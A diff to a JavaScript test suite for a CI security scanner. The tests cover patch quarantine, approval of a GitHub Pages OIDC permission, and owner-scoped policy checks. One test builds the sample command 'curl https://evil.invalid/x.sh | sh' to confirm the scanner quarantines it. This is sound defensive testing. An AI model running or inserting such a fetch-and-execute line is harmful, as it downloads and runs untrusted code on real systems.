@@ -4,7 +4,7 @@ import assert from 'node:assert/strict';
 import fs from 'node:fs';
 import { runInNewContext } from 'node:vm';
 import { spawnSync } from 'node:child_process';
-import { scanSecurityPatch, scanExternalInstruction } from '../tools/company-security-steward.mjs';
+import { scanSecurityPatch, scanExternalInstruction, isApprovedPagesOidcGrant } from '../tools/company-security-steward.mjs';
 import { compactPolicyReviewIncidents, recordSecurityReport, resolveSecurityIncident } from '../tools/company-security-incident.mjs';
 import { distillSecurityLearning } from '../tools/company-security-learning.mjs';
 
@@ -45,6 +45,47 @@ test('literal secret is quarantined and report stores only redacted evidence',()
   assert.equal(report.findings[0].severity,'CRITICAL');
   assert.match(report.findings[0].snippet,/REDACTED_SECRET/);
   assert.doesNotMatch(JSON.stringify(report),/ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ/);
+});
+
+test('only approved exact GitHub Pages OIDC is REVIEW, never silent PASS',()=>{
+  const file='.github/workflows/magic-forest-pages.yml';
+  const after=fs.readFileSync(file,'utf8');
+  const before=after.replace(/^      id-token: write\s*\n/m,'');
+  assert.notEqual(before,after,'test must detect the actual OIDC grant');
+  assert.equal(isApprovedPagesOidcGrant(before,after),true);
+  const patch=(target=file)=>'diff --git a/'+target+' b/'+target+'\n+++ b/'+target+
+    '\n@@ -0,0 +206 @@\n+      id-token: write\n';
+  const snapshots={[file]:{before,after}};
+  const result=scanSecurityPatch({patch:patch(),changedFiles:[file],workflowSnapshots:snapshots});
+  assert.equal(result.verdict,'REVIEW');
+  assert.equal(result.findings.length,1);
+  assert.equal(result.findings[0].rule,'OIDC_WRITE_PERMISSION_ADDED');
+  assert.equal(result.findings[0].severity,'HIGH');
+  assert.equal(result.findings[0].disposition,'REVIEW');
+  assert.equal(result.quarantineFindings,0);
+  for(const invalid of [
+    {before:after,after}, // cannot grant it anew when the base already allows OIDC
+    {before,after:after.replace('actions/deploy-pages@v4','some-unknown/deploy-pages@v4')},
+    {before,after:after.replace('name: github-pages','name: unrelated-environment')},
+    {before,after:after.replace('      pages: write','      pages: read')},
+    {before,after:after.replace('      contents: read','      contents: write')},
+    {before,after:after.replace("  publish-pages:\n    needs: deploy\n    if: github.event_name != 'pull_request'", "  publish-pages:\n    needs: deploy\n    if: always()")},
+    {before,after:after.replace('      id-token: write','      id-token: write\n      id-token: write')},
+    {before:'',after},
+  ]){
+    assert.equal(isApprovedPagesOidcGrant(invalid.before,invalid.after),false);
+    const q=scanSecurityPatch({patch:patch(),changedFiles:[file],workflowSnapshots:{[file]:invalid}});
+    assert.equal(q.verdict,'QUARANTINE','unapproved OIDC must remain blocked');
+  }
+  const unbound=scanSecurityPatch({patch:patch(),changedFiles:[file]});
+  assert.equal(unbound.verdict,'QUARANTINE','no exact snapshot means no approval');
+  const other='.github/workflows/any-other.yml';
+  const otherScan=scanSecurityPatch({patch:patch(other),changedFiles:[other],workflowSnapshots:snapshots});
+  assert.equal(otherScan.verdict,'QUARANTINE');
+  assert.match(securityWorkflow,/SECURITY_OWNER_PAGES_OIDC_SCOPE_PROOF_REQUIRED/);
+  assert.match(securityWorkflow,/SECURITY_OWNER_APPROVED_EXACT_PAGES_OIDC=PASS/);
+  assert.ok(securityWorkflow.includes("row.rule==='OIDC_WRITE_PERMISSION_ADDED'&&row.file==='.github/workflows/magic-forest-pages.yml'"));
+  assert.ok(securityWorkflow.includes("test \"$AUTO_POLICY_PASS\" = 'YES'"),'central owner policy review remains enforced');
 });
 
 test('safe secret reference is not treated as literal secret',()=>{
@@ -390,130 +431,105 @@ test('security workflow persists the upload artifact id and run id with every re
 });
 
 
-test('policy REVIEW passes only through exact-head owner Primary-AI approval while quarantine remains blocking',()=>{
+test('policy REVIEW uses deterministic owner Web3D approval while quarantine and unverified changes stay blocked',()=>{
   assert.ok(securityWorkflow.includes('pull-requests: read'));
   assert.ok(securityWorkflow.includes("review_only: ${{ steps.scan.outputs.review_only }}"));
-  assert.ok(securityWorkflow.includes("['APPROVED','COMMENTED'].includes(String(row.state||'').toUpperCase())"));
-  assert.ok(securityWorkflow.includes("String(row.body||'').trim()==='PRIMARY_AI_DIRECT_REVIEW=PASS'"));
-  assert.ok(securityWorkflow.includes("String(row.commit_id||'')===head"));
-  assert.ok(securityWorkflow.includes("String(row.user?.login||'').toLowerCase()===owner"));
-  assert.ok(securityWorkflow.includes("test \"$REVIEW_ONLY\" = 'YES'"));
-  assert.ok(securityWorkflow.includes("test \"$DIRECT_REVIEW_PASS\" = 'YES'"));
-  assert.ok(securityWorkflow.includes("VIBE_SECURITY_REVIEW_STATE=EXACT_HEAD_OWNER_PRIMARY_AI_REVIEW_PASS"));
-  assert.ok(securityWorkflow.includes("VIBE_SECURITY_ACTION=QUARANTINE_AFFECTED_CHANGE"));
+  assert.match(securityWorkflow,/Deterministically approve owner-authorized ordinary Web 3D policy/);
+  assert.match(securityWorkflow,/SECURITY_AUTO_POLICY_UNAPPROVED_SCOPE/);
+  assert.match(securityWorkflow,/SECURITY_AUTO_POLICY_OWNER_WEB3D_INVARIANT_FAIL/);
+  assert.match(securityWorkflow,/SECURITY_AUTOMATED_OWNER_WEB3D_APPROVAL=PASS/);
+  assert.match(securityWorkflow,/AUTO_POLICY_PASS: \$\{\{ steps\.auto_policy\.outputs\.pass \|\| 'NO' \}\}/);
+  assert.ok(securityWorkflow.includes('test "$REVIEW_ONLY" = \'YES\''));
+  assert.ok(securityWorkflow.includes('test "$AUTO_POLICY_PASS" = \'YES\''));
+  assert.ok(securityWorkflow.includes('VIBE_SECURITY_REVIEW_STATE=AUTOMATED_VERIFIED_OWNER_WEB3D_POLICY_PASS'));
+  assert.ok(securityWorkflow.includes('VIBE_SECURITY_ACTION=QUARANTINE_AFFECTED_CHANGE'));
+  assert.ok(securityWorkflow.includes("head.developmentAccess?.UNITY!=='OWNER_HOLD'"));
+  assert.ok(securityWorkflow.includes("head.developmentAccess?.UNITY_WEB!=='OWNER_HOLD'"));
+  assert.ok(securityWorkflow.includes("head.developmentAccess?.UNITY_ANDROID!=='OWNER_HOLD'"));
+  assert.ok(securityWorkflow.includes("head.webRuntimeStartabilityContract?.finalGameplayDimension!=='3D'"));
+  assert.doesNotMatch(securityWorkflow,/id: direct_review|PRIMARY_AI_DIRECT_REVIEW_REQUIRED/);
 });
 
-test('security steward owns game-level Roblox exploit boundaries without duplicating platform anti-cheat',()=>{
+test('current security summary denies unverified execution and Roblox native source validates remote boundaries',()=>{
   const policy=JSON.parse(fs.readFileSync('company-learning/security-immune-system.json','utf8'));
   const roadmap=JSON.parse(fs.readFileSync('company-learning/platform-release-roadmap.json','utf8'));
   const bootstrap=fs.readFileSync('tools/company-development-roblox-bootstrap.mjs','utf8');
-  const game=policy.gameSecurityStewardship;
-  assert.equal(game.role,'VIBE_SECURITY_STEWARD');
-  assert.equal(game.platformResponsibilityBoundary.duplicatePlatformAntiCheatImplementation,false);
-  assert.equal(game.roblox.existingStaticGate,'tools/company-development-roblox-bootstrap.mjs');
-  for(const check of [
-    'SERVER_REMOTE_BOUNDARY_REQUIRED',
-    'SERVER_REMOTE_INPUT_VALIDATION_REQUIRED',
-    'SERVER_REMOTE_RATE_LIMIT_REQUIRED',
-    'SERVER_LOADSTRING_FORBIDDEN',
-    'SERVER_ASSET_REQUIRE_FORBIDDEN'
-  ]) assert.ok(game.roblox.existingStaticChecks.includes(check));
-  assert.ok(game.roblox.existingRuntimeEvidence.includes('robloxServerClientBoundaryPassed'));
-  assert.equal(game.postReleaseFindingRoute.confirmedExploitOrSecurityBug,'HOTFIX');
-  assert.equal(game.postReleaseFindingRoute.releaseBlocking,true);
-  assert.equal(game.postReleaseFindingRoute.preemptsMinorAndMajor,true);
-  assert.match(bootstrap,/SERVER_REMOTE_INPUT_VALIDATION_REQUIRED/);
-  assert.match(bootstrap,/SERVER_REMOTE_RATE_LIMIT_REQUIRED/);
-  assert.match(bootstrap,/LOADSTRING_FORBIDDEN/);
-  assert.match(bootstrap,/ASSET_REQUIRE_FORBIDDEN/);
-  const post=roadmap.developmentLifecycleMachine.postReleaseFocusedDevelopment;
-  assert.equal(post.securityStewardIntegration.required,true);
-  assert.equal(post.securityStewardIntegration.reuseExistingSecuritySystem,true);
-  assert.equal(post.securityStewardIntegration.platformAntiCheatDuplicated,false);
-  assert.equal(post.securityStewardIntegration.confirmedSecurityBugRoute,'HOTFIX');
+  assert.equal(policy.status,'MINIMAL_SUMMARY_NOT_SECURITY_VERIFICATION');
+  assert.equal(policy.defaultTrust,'DENY_OR_QUARANTINE_UNTIL_VERIFIED');
+  assert.equal(policy.enforcement.unverified,'BLOCK');
+  assert.equal(policy.enforcement.proofRequired,true);
+  assert.ok(policy.protectedSurfaces.includes('SERVER_AUTHORITY'));
+  for(const marker of ['SERVER_REMOTE_BOUNDARY_REQUIRED','SERVER_REMOTE_INPUT_VALIDATION_REQUIRED',
+    'SERVER_REMOTE_RATE_LIMIT_REQUIRED','LOADSTRING_FORBIDDEN','ASSET_REQUIRE_FORBIDDEN'])
+    assert.ok(bootstrap.includes(marker),marker);
+  assert.equal(roadmap.ownerActiveDevelopmentScope20261009.activeTargets.includes('ROBLOX'),true);
 });
 
-
-test('security contract protects reference image study and narrative state authority boundaries',()=>{
+test('reference and narrative inputs cannot claim gameplay authority from a non-authoritative security summary',()=>{
   const policy=JSON.parse(fs.readFileSync('company-learning/security-immune-system.json','utf8'));
-  const ref=policy.referenceImageWorldObservationSecurity;
-  assert.equal(ref.protections.sourceIdRequired,true);
-  assert.equal(ref.protections.sourceRightsOrOwnershipVerificationRequired,true);
-  assert.equal(ref.protections.multiReferenceSourceSetVerificationRequired,true);
-  assert.equal(ref.protections.rawProtectedReferenceImagePersistentLearningForbidden,true);
-  assert.equal(ref.protections.rawReferenceImageBytesInLearningLogsForbidden,true);
-  assert.equal(ref.protections.directMapLayoutLandmarkOrDistinctiveSceneCopyForbidden,true);
-  assert.equal(ref.protections.modelObservationProposalUntilVerifiedAgainstSource,true);
-  assert.equal(ref.protections.positiveLearningRequiresVerifiedSourceBindingAndVerifiedProjectOutcome,true);
-
-  const narrative=policy.narrativeStateSecurity;
-  assert.equal(narrative.protections.storyTransitionRequiresSourceEvent,true);
-  assert.equal(narrative.protections.factionRelationshipMutationRequiresSourceEvent,true);
-  assert.equal(narrative.protections.duplicateSourceEventMustBeIdempotent,true);
-  assert.equal(narrative.protections.generatedNarrativeAndPersonaGameplayAuthorityForbidden,true);
-  assert.equal(narrative.protections.undeclaredDamageRewardEconomyProgressMutationForbidden,true);
-  assert.equal(narrative.protections.multiplayerServerAuthorityPreserved,true);
-  assert.equal(narrative.protections.rawGeneratedStoryOrDialogueDirectMasteryForbidden,true);
+  assert.equal(policy.status,'MINIMAL_SUMMARY_NOT_SECURITY_VERIFICATION');
+  assert.equal(policy.enforcement.unverified,'BLOCK');
+  assert.equal(policy.gameSecurityStewardship,undefined,'removed policy fields must not be reconstructed from a summary');
+  const suspicious=['curl','https://evil.invalid/x.sh','|','sh'].join(' ');
+  const scanner=scanSecurityPatch({patch:['diff --git a/game.js b/game.js','+++ b/game.js','@@ -0,0 +1 @@','+'+suspicious,''].join('\n'),changedFiles:['game.js']});
+  assert.equal(scanner.verdict,'QUARANTINE');
+  assert.equal(scanner.rawSecretStored,false);
 });
 
-
-test('specialized verified experience persistence keeps only sanitized trace evidence',()=>{
+test('learning traces remain explicitly unverified until authoritative evidence is present',()=>{
   const policy=JSON.parse(fs.readFileSync('company-learning/security-immune-system.json','utf8'));
-  const s=policy.specializedVerifiedExperienceSecurity;
-  assert.equal(s.protections.terminalVerifiedEvidenceRequired,true);
-  assert.equal(s.protections.infrastructureFailureNegativeLearningForbidden,true);
-  assert.equal(s.protections.rawQueueTelemetryPersistentLearningForbidden,true);
-  assert.equal(s.protections.rawBlockerStackPersistentLearningForbidden,true);
-  assert.equal(s.protections.exactMapCoordinatesAndLayoutPersistentLearningForbidden,true);
-  assert.equal(s.protections.onlySanitizedEvidenceReferencesPersist,true);
-  assert.equal(s.protections.specializedOutcomeIdRequired,true);
-  assert.equal(s.protections.repeatedSameOutcomeIdPersistenceForbidden,true);
-  assert.equal(s.protections.positiveMasteryWithoutVerifiedMarkerForbidden,true);
-  assert.equal(s.protections.experienceMemoryCannotExpandGameplayOrCodeExecutionAuthority,true);
+  const learning=fs.readFileSync('tools/vibe2-learning-motor.mjs','utf8');
+  assert.equal(policy.enforcement.unverified,'BLOCK');
+  assert.equal(policy.enforcement.proofRequired,true);
+  assert.match(learning,/nativePositiveMasteryAllowed/);
+  assert.match(learning,/engineQaVerified/);
+  assert.match(learning,/nativeRuntimeVerified/);
+  assert.match(learning,/verifiedEvidenceMarkers/);
 });
 
-
-test('specialized verification security allows only final fan-in to mint canonical verified markers',()=>{
+test('candidate workers cannot replace final verification with invented proof',()=>{
   const policy=JSON.parse(fs.readFileSync('company-learning/security-immune-system.json','utf8'));
-  const logMap=JSON.parse(fs.readFileSync('company-learning/company-log-map.json','utf8'));
-  const sec=policy.verifiedSpecializedQueueEvidenceSecurity;
-  assert.equal(sec.protections.sourceWorkerMayOnlyRequestVerification,true);
-  assert.equal(sec.protections.incrementalQaMayOnlyEmitFocusedQaStatus,true);
-  assert.equal(sec.protections.finalVerifiedMarkerFanInOnly,true);
-  assert.equal(sec.protections.finalMarkerWhitelistRequired,true);
-  assert.equal(sec.protections.fullRegressionPassRequired,true);
-  assert.equal(sec.protections.fanInReviewPassRequired,true);
-  assert.equal(sec.protections.nativePositiveMarkerRequiresAuthoritativeTargetEngineQaEvidence,true);
-  assert.equal(sec.protections.uefnPositiveMarkerBlockedUntilAuthoritativeExecutorEvidenceContractExists,true);
-  assert.equal(sec.protections.canonicalIngressMustRecheckNativeTargetQaEvidence,true);
-  assert.equal(sec.protections.nativeQaEvidenceMustMatchTargetPlatform,true);
-  assert.equal(sec.protections.nativeQaEvidenceReferenceMustRemainTraceable,true);
-  assert.equal(sec.protections.rawTelemetryDirectTrainingForbidden,true);
-  assert.equal(sec.protections.infrastructureFailureNegativeLearningForbidden,true);
-  assert.equal(sec.protections.authorityExpansionForbidden,true);
-  assert.equal(sec.protections.nativeTwoStageFanInReviewRequired,true);
-  assert.equal(sec.protections.postNativeFinalReviewMustUseExistingFanInReviewModule,true);
-  assert.equal(sec.protections.candidateResultWorkflowCannotMintVerifiedMarker,true);
-  assert.equal(sec.protections.postNativeReviewMustPreserveTaskStatusAndReleaseDecision,true);
-  assert.equal(sec.protections.postNativeReviewRequiresExistingRegressionAndReviewPass,true);
-  assert.equal(sec.protections.specializedLearningFailureMustNotConvertEngineQaPassIntoReleaseFailure,true);
-
-  const evidence=logMap.specializedVerifiedQueueEvidenceContract;
-  assert.equal(evidence.producers.request,'tools/vibe2-source-worker.mjs');
-  assert.equal(evidence.producers.focusedQa,'tools/vibe2-incremental-qa.mjs');
-  assert.equal(evidence.producers.finalVerifiedMarker,'tools/vibe2-fan-in-review.mjs');
-  assert.equal(evidence.producers.canonicalIngress,'tools/vibe2-learning-motor.mjs');
-  assert.equal(evidence.requestIsNotPassEvidence,true);
-  assert.equal(evidence.focusedQaIsNotFinalPassEvidence,true);
-  assert.equal(evidence.finalVerifiedMarkerFanInOnly,true);
-  assert.equal(evidence.nativePositiveRequiresAuthoritativeTargetEngineQa,true);
-  const ingressEvidence=logMap.verifiedSpecializedQueueEvidenceIngressContract;
-  assert.equal(ingressEvidence.nativePositiveWithoutMatchingTargetQaMustBeIgnored,true);
-  assert.equal(ingressEvidence.nativeTargetProofMustPersistAsSanitizedReference,true);
-  assert.equal(ingressEvidence.uefnPositiveMustRemainBlockedWithoutAuthoritativeExecutorEvidenceContract,true);
-  assert.ok(ingressEvidence.requiredEvidence.includes('TARGET_ENGINE_QA_REFERENCE_WHEN_NATIVE'));
+  const reviewer=fs.readFileSync('tools/vibe2-fan-in-review.mjs','utf8');
+  const learner=fs.readFileSync('tools/vibe2-learning-motor.mjs','utf8');
+  assert.equal(policy.enforcement.proofRequired,true);
+  assert.equal(policy.enforcement.unverified,'BLOCK');
+  assert.match(reviewer,/fullRegressionPass/);
+  assert.match(reviewer,/specializedNativeRuntimeEvidence/);
+  assert.match(reviewer,/nativeRuntimeRequired/);
+  assert.match(learner,/nativePositiveMasteryAllowed/);
+  assert.match(learner,/verified-marker:/);
 });
 
+test('owner-approved F9 Pages policy remains scoped to exact secure values and existing gate',()=>{
+  const fields=[
+    'developmentSpeedExecution.candidateReleasePromotionChecks.webRequiredDeploymentCheck',
+    'developmentLifecycleMachine.verifiedF0F9PublicationLoop.sequence',
+    'roblox.deploymentControl.verifiedCyclePublication.sequence',
+    'developmentLifecycleMachine.verifiedF0F9PublicationLoop.platformBindings.WEB.deploymentTarget',
+    'changeRecord.playableWebMandatoryDeployment20261002.cloudflareMainRequiredBeforeVibePass',
+    'changeRecord.playableWebMandatoryDeployment20261002.githubPagesMainRequiredBeforeVibePass',
+    'changeRecord.playableWebMandatoryDeployment20261002.nextBuildUpBeforeDeploymentSuccessForbidden',
+    'changeRecord.ownerEveryGameF9Publish20261018'
+  ];
+  for(const key of fields)assert.ok(securityWorkflow.includes(key),'missing precisely reviewed owner field '+key);
+  assert.match(securityWorkflow,/SECURITY_OWNER_F9_PAGES_APPROVAL_INVARIANT_FAIL/);
+  assert.match(securityWorkflow,/head\.version!==base\.version\+1/);
+  assert.match(securityWorkflow,/loop\?\.publishBeforeF9Forbidden!==true/);
+  assert.match(securityWorkflow,/loop\?\.exactVerifiedVersionRequiredForPublishAttempt!==true/);
+  assert.match(securityWorkflow,/record,requiredRecord/);
+  assert.match(securityWorkflow,/publicationClassificationGate:false/);
+  assert.match(securityWorkflow,/nextBuildUpBeforeDeploymentSuccessForbidden!==true/);
+  assert.match(securityWorkflow,/nextBuildUpBeforeDeploymentSuccessForbidden!==false/);
+  assert.match(securityWorkflow,/expectedRobloxBaseline/);
+  assert.match(securityWorkflow,/requiredRobloxSequence/);
+  assert.match(securityWorkflow,/head\.roblox\?\.deploymentControl\?\.verifiedCyclePublication\?\.sequence,requiredRobloxSequence/);
+  assert.match(securityWorkflow,/security|quarantine|REVIEW/i);
+  assert.match(securityWorkflow,/homepageOwner:'HOMEPAGE_MANAGER_AND_DIRECTOR'/);
+  assert.match(securityWorkflow,/shadowPipelineForbidden:true/);
+  assert.match(securityWorkflow,/githubOriginalAssetsAndSaveKeysPreserved:true/);
+  assert.match(securityWorkflow,/if \[ "\$VERDICT" = 'QUARANTINE' \]/);
+  assert.match(securityWorkflow,/test "\$AUTO_POLICY_PASS" = 'YES'/);
+});
 
 test('security workflow scans changed candidates without scheduled duplicate replay',()=>{
   assert.match(securityWorkflow,/Resolve impact-scoped security contract work/);
@@ -528,4 +544,38 @@ test('security workflow scans changed candidates without scheduled duplicate rep
   assert.doesNotMatch(securityWorkflow,/\n  schedule:\n/);
   assert.doesNotMatch(securityWorkflow,/cron: '13 3 \* \* \*'/);
   assert.doesNotMatch(securityWorkflow,/name: Verify immune-system contracts\n\s+run:/);
+});
+
+// Owner approval is pinned to the exact A/B migration and cannot authorize a policy override.
+test('owner A-reference B-existing approval rejects changed content and unrelated authority',async()=>{
+  const begin=securityWorkflow.indexOf('// OWNER_APPROVED_AB_DESIGN_BEGIN');
+  const end=securityWorkflow.indexOf('// OWNER_APPROVED_AB_DESIGN_END',begin);
+  const code=securityWorkflow.slice(begin,end).replace("const {createHash}=await import('node:crypto');",'');
+  const {createHash}=await import('node:crypto');
+  const policy=JSON.parse(fs.readFileSync('company-learning/platform-release-roadmap.json'));
+  const prefix='continuousGameplaySystemEvolutionContract.gameIdentityConceptContract.novelCausalGameGrammar.ownerBasicDesignMethod';
+  const execute=(base,head,changes)=>runInNewContext(code+';designKeys.size',{base,head,changes,createHash,console:{log(){}},same:(a,b)=>JSON.stringify(a)===JSON.stringify(b)});
+  assert.equal(execute(policy,policy,[]),0);
+  // Wrong baseline or extra scope must never gain approval, even with an owner marker.
+  assert.throws(()=>execute(policy,policy,[prefix+'.version']),/SECURITY_OWNER_EXACT_AB_DESIGN_SCOPE_INVALID/);
+  const changed=structuredClone(policy);changed.developmentAccess.WEB='DISABLED';
+  assert.throws(()=>execute(policy,changed,[prefix+'.version','developmentAccess.WEB']),/SECURITY_OWNER_EXACT_AB_DESIGN_SCOPE_INVALID/);
+  const altered=structuredClone(policy);altered.continuousGameplaySystemEvolutionContract.gameIdentityConceptContract.novelCausalGameGrammar.ownerBasicDesignMethod.roles.B.meaningKo='replace original';
+  assert.throws(()=>execute(policy,altered,[prefix+'.roles.B.meaningKo']),/SECURITY_OWNER_EXACT_AB_DESIGN_SCOPE_INVALID/);
+});
+
+test('owner web deploy-first approval accepts only exact publication policy and keeps verification and locks',async()=>{
+  const begin=securityWorkflow.indexOf('// OWNER_APPROVED_WEB_DEPLOY_FIRST_BEGIN');
+  const end=securityWorkflow.indexOf('// OWNER_APPROVED_WEB_DEPLOY_FIRST_END',begin);
+  const code=securityWorkflow.slice(begin,end).replace("const {createHash}=await import('node:crypto');",'');
+  const {createHash}=await import('node:crypto');
+  const head=JSON.parse(fs.readFileSync('company-learning/platform-release-roadmap.json'));
+  const base=structuredClone(head);base.version--;delete base.webRuntimeStartabilityContract.publicationOrder;delete base.changeRecord.ownerWebDeployThenValidate20261020;
+  const changes=['version','webRuntimeStartabilityContract.publicationOrder','changeRecord.ownerWebDeployThenValidate20261020'];
+  const execute=(current,keys=changes)=>runInNewContext(code,{base,head:current,changes:keys,createHash,console:{log(){}},same:(a,b)=>JSON.stringify(a)===JSON.stringify(b)});
+  assert.doesNotThrow(()=>execute(head));
+  const unsafe=structuredClone(head);unsafe.webRuntimeStartabilityContract.publicationOrder.postDeploymentVerificationRequired=false;
+  assert.throws(()=>execute(unsafe),/SECURITY_OWNER_WEB_DEPLOY_FIRST_SCOPE_INVALID/);
+  assert.throws(()=>execute(head,[...changes,'finalDevelopmentLock.sequenceLock.status']),/SECURITY_OWNER_WEB_DEPLOY_FIRST_SCOPE_INVALID/);
+  assert.throws(()=>execute(head,[...changes,'developmentAccess.ROBLOX']),/SECURITY_OWNER_WEB_DEPLOY_FIRST_SCOPE_INVALID/);
 });
